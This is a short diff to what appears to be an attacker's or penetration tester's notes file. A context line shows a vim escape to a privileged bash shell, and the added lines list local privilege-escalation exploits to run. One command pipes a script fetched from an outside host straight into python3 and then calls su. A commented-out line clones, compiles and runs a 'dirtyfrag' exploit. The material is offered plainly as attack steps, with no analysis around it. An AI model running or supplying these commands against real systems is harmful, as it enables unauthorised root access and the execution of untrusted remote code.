@@ -216,3 +216,12 @@ Use vim to hide our shell
 
     vim 
     : ! /bin/bash -p
+
+Run known local priv escalation (LPE) exploits: 
+
+    # copy-fail-CVE-2026-31431
+    curl https://copy.fail/exp | python3 && su - 
+    
+    # dirty-frag-CVE-2026-43500
+    # git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+    
